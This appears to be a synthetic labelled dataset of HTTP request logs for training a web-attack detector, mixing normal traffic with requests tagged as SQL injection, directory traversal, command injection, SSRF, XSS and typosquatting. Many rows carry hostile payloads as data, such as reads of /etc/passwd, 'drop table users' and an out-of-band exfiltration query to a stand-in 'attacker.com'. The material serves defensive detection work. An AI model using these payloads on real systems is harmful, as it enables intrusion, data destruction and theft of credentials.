timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server
2026-03-12 13:34:53,198.51.100.239,192.168.1.1,http,get,"/search?q=' and (select * from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--","{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,403,4662,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,"' and (select * from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--",sql_injection,13,3,0,1,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",52.45.123.89,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Apache
2026-03-04 01:05:08,10.0.0.192,34.120.45.67,https,get,/search?q='; drop table users--,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,401,3016,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,'; drop table users--,sql_injection,1,2,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",203.0.113.45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,IIS
2026-03-09 21:03:09,198.51.100.26,104.18.24.12,https,get,https://yhoo.com/login?redirect=/dashboard,"{""Host"":""34.120.45.67"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,404,2271,"{""Content-Type"":""text/html"",""Server"":""IIS""}",XSStrike/3.1.5,yhoo.com,typosquatting_url_spoofing,21,0,0,1,"{'Host': '34.120.45.67', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",34.120.45.67,XSStrike/3.1.5,*/*,text/html,IIS
2026-03-14 16:52:55,198.51.100.59,172.67.128.45,https,get,/download?file=%25%32%65%25%32%65%25%32%66etc/passwd,"{""Host"":""198.51.100.23"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,404,1474,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Nikto/2.5.0,%2e%2e%2fetc/passwd,directory_traversal,16,5,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",198.51.100.23,Nikto/2.5.0,*/*,text/html,nginx
2026-03-22 17:57:14,10.0.0.192,203.0.113.45,https,get,https://wwwtwittercom/login,"{""Host"":""203.0.113.45"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,403,7140,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nikto/2.5.0,wwwtwittercom,typosquatting_url_spoofing,17,6,1,1,"{'Host': '203.0.113.45', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",203.0.113.45,Nikto/2.5.0,*/*,text/html,IIS
2026-03-09 19:08:40,10.0.0.35,52.45.123.89,http,get,https://facebook-password-reset.org/login,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,401,634,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,facebook-password-reset.org,typosquatting_url_spoofing,19,0,0,1,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",172.67.128.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-19 06:40:57,10.0.0.254,34.120.45.67,https,get,/search?q='; waitfor delay '0:0:5'--,"{""Host"":""10.0.0.1"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,404,6125,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nikto/2.5.0,'; waitfor delay '0:0:5'--,sql_injection,6,3,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",10.0.0.1,Nikto/2.5.0,*/*,text/html,IIS
2026-03-18 13:31:29,172.16.0.176,3.12.45.78,http,get,/download?file=..%255c..%255c..%255cwindows%255cwin.ini,"{""Host"":""10.0.0.1"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,500,3727,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Nikto/2.5.0,..%5c..%5c..%5cwindows%5cwin.ini,directory_traversal,13,2,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",10.0.0.1,Nikto/2.5.0,*/*,text/html,nginx
2026-03-23 10:18:06,10.0.0.187,198.51.100.23,http,get,/search?q='; insert into logs values('hacked')--,"{""Host"":""192.168.1.1"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,403,7265,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nikto/2.5.0,'; insert into logs values('hacked')--,sql_injection,10,0,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,Nikto/2.5.0,*/*,text/html,Apache
2026-03-18 12:02:31,10.0.0.20,34.120.45.67,http,get,https://g00gle.com/login,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,403,5973,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,g00gle.com,typosquatting_url_spoofing,12,2,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-07 14:19:49,192.168.1.177,3.12.45.78,http,get,/download?file=..%252f..%252f..%252fetc%252fpasswd,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,401,4438,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,..%2f..%2f..%2fetc%2fpasswd,directory_traversal,14,5,1,1,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Apache
2026-03-12 12:51:22,10.0.0.251,10.0.0.1,http,get,/user?username='; drop table users--,"{""Host"":""34.120.45.67"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,404,6800,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Nikto/2.5.0,'; drop table users--,sql_injection,12,3,0,1,"{'Host': '34.120.45.67', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",34.120.45.67,Nikto/2.5.0,*/*,text/html,nginx
2026-03-05 02:35:23,10.0.0.223,198.51.100.23,http,get,/traceroute?host=&& timeout 5,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,403,7304,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,&& timeout 5,command_injection,2,3,0,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-08 15:50:09,172.16.0.220,10.0.0.1,https,get,/ping?ip=127.0.0.1; cat /etc/passwd,"{""Host"":""203.0.113.45"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,302,6573,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nmap Scripting Engine,; cat /etc/passwd,command_injection,15,6,1,1,"{'Host': '203.0.113.45', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",203.0.113.45,Nmap Scripting Engine,*/*,text/html,Apache
2026-03-14 07:03:55,10.0.0.245,10.0.0.1,https,post,/api/v1/products,"{""Host"":""203.0.113.45"",""User-Agent"":""python-requests/2.28.0"",""Accept"":""*/*""}",email=user@example.com&subscribe=true,200,1302,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",python-requests/2.28.0,,normal,7,5,1,0,"{'Host': '203.0.113.45', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",203.0.113.45,python-requests/2.28.0,*/*,text/html,Cloudflare
2026-03-08 17:36:18,203.0.113.77,10.0.0.1,http,get,/search?q='; drop table users--,"{""Host"":""3.12.45.78"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200,2661,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,'; drop table users--,sql_injection,17,6,1,1,"{'Host': '3.12.45.78', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",3.12.45.78,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,IIS
2026-03-07 13:44:32,10.0.0.91,10.0.0.1,https,get,/about,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,200,1941,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,,normal,13,5,1,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Apache
2026-03-22 15:29:45,10.0.0.67,198.51.100.23,https,get,/home?sort=admin,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,1760,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,,normal,15,6,1,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-04 10:34:05,10.0.0.21,172.67.128.45,https,post,/blog,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",comment=Great article!,200,1942,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,,normal,10,2,0,0,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",10.0.0.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Cloudflare
2026-03-20 11:07:13,172.16.0.18,203.0.113.45,https,get,/css/style.css?id=admin,"{""Host"":""185.199.108.153"",""User-Agent"":""python-requests/2.28.0"",""Accept"":""*/*""}",,200,2733,"{""Content-Type"":""text/html"",""Server"":""nginx""}",python-requests/2.28.0,,normal,11,4,0,0,"{'Host': '185.199.108.153', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,python-requests/2.28.0,*/*,text/html,nginx
2026-03-02 13:07:18,192.168.1.18,10.0.0.1,https,get,/traceroute?host=; cat /etc/passwd,"{""Host"":""172.67.128.45"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,401,2178,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nikto/2.5.0,; cat /etc/passwd,command_injection,13,0,0,1,"{'Host': '172.67.128.45', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",172.67.128.45,Nikto/2.5.0,*/*,text/html,IIS
2026-03-13 06:56:53,203.0.113.101,10.0.0.1,http,get,/ping?ip=127.0.0.1-e /bin/bash,"{""Host"":""10.0.0.1"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,403,4357,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nikto/2.5.0,-e /bin/bash,command_injection,6,4,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,Nikto/2.5.0,*/*,text/html,Apache
2026-03-20 19:36:00,10.0.0.99,10.0.0.1,https,post,/settings,"{""Host"":""34.120.45.67"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",comment=Great article!,200,3772,"{""Content-Type"":""text/html"",""Server"":""nginx""}",curl/7.81.0,,normal,19,4,0,0,"{'Host': '34.120.45.67', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",34.120.45.67,curl/7.81.0,*/*,text/html,nginx
2026-03-19 13:45:42,192.168.1.178,198.51.100.23,http,get,"/user?username=' and substring(database(),1,1)='a'--","{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,404,1103,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,"' and substring(database(),1,1)='a'--",sql_injection,13,3,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,IIS
2026-03-16 14:51:14,192.168.1.42,192.168.1.1,https,get,/download?file=../../../etc/passwd%00.png,"{""Host"":""34.120.45.67"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",,302,7656,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,../../../etc/passwd.png,directory_traversal,14,0,0,1,"{'Host': '34.120.45.67', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",34.120.45.67,SQLmap/1.8.4,*/*,text/html,nginx
2026-03-14 23:13:36,192.168.1.103,185.199.108.153,https,get,/login?q=books,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,200,1149,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,23,5,1,0,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,nginx
2026-03-08 13:46:26,10.0.0.239,192.168.1.1,https,get,/,"{""Host"":""172.67.128.45"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,200,2375,"{""Content-Type"":""text/html"",""Server"":""nginx""}",curl/7.81.0,,normal,13,6,1,0,"{'Host': '172.67.128.45', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,curl/7.81.0,*/*,text/html,nginx
2026-03-09 19:28:30,192.168.1.146,34.120.45.67,https,get,/download/file.pdf,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,4012,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,,normal,19,0,0,0,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",203.0.113.45,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Cloudflare
2026-03-15 18:33:12,203.0.113.160,172.67.128.45,https,get,/login?user=1,"{""Host"":""185.199.108.153"",""User-Agent"":""wget/1.21.2"",""Accept"":""*/*""}",,200,3994,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",wget/1.21.2,,normal,18,6,1,0,"{'Host': '185.199.108.153', 'User-Agent': 'wget/1.21.2', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",185.199.108.153,wget/1.21.2,*/*,text/html,Cloudflare
2026-03-12 20:58:35,172.16.0.133,192.168.1.1,http,get,"/login?user=' and load_file(concat('\\',database(),'.attacker.com\'))--","{""Host"":""3.12.45.78"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",,200,3202,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,"' and load_file(concat('\\',database(),'.attacker.com\'))--",sql_injection,20,3,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,SQLmap/1.8.4,*/*,text/html,nginx
2026-03-02 10:22:02,198.51.100.170,192.168.1.1,https,get,/fetch?url=http://169.254.169.254/latest/meta-data,"{""Host"":""185.199.108.153"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,403,3208,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Nikto/2.5.0,http://169.254.169.254/latest/meta-data/,ssrf,10,0,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,Nikto/2.5.0,*/*,text/html,nginx
2026-03-23 02:38:13,192.168.1.151,104.18.24.12,http,get,/register,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,200,2056,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,2,0,0,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,nginx
2026-03-15 13:06:34,10.0.0.117,172.67.128.45,https,get,/api/v1/products?category=1,"{""Host"":""34.120.45.67"",""User-Agent"":""python-requests/2.28.0"",""Accept"":""*/*""}",,200,3475,"{""Content-Type"":""text/html"",""Server"":""Apache""}",python-requests/2.28.0,,normal,13,6,1,0,"{'Host': '34.120.45.67', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,python-requests/2.28.0,*/*,text/html,Apache
2026-03-09 23:23:04,172.67.128.16,3.12.45.78,https,get,/profile,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,3695,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,,normal,23,0,0,0,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",10.0.0.1,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,nginx
2026-03-03 09:49:14,172.16.0.148,104.18.24.12,http,get,/ping?ip=127.0.0.1| ping -c 10 127.0.0.1,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,404,5498,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,| ping -c 10 127.0.0.1,command_injection,9,1,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Apache
2026-03-20 11:24:52,104.18.24.72,34.120.45.67,https,post,/comment,"{""Host"":""203.0.113.45"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",comment=javascript%3Aalert%28%27XSS%27%29,200,6471,"{""Content-Type"":""text/html"",""Server"":""IIS""}",SQLmap/1.8.4,javascript:alert('xss'),xss,11,4,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",203.0.113.45,SQLmap/1.8.4,*/*,text/html,IIS
2026-03-01 13:12:43,10.0.0.210,3.12.45.78,http,get,/js/script.js,"{""Host"":""198.51.100.23"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,302,4174,"{""Content-Type"":""text/html"",""Server"":""nginx""}",curl/7.81.0,,normal,13,6,1,0,"{'Host': '198.51.100.23', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",198.51.100.23,curl/7.81.0,*/*,text/html,nginx
2026-03-15 13:06:45,10.0.0.178,34.120.45.67,https,get,/search?q=' or 1=1--,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,403,3334,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,' or 1=1--,sql_injection,13,6,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache
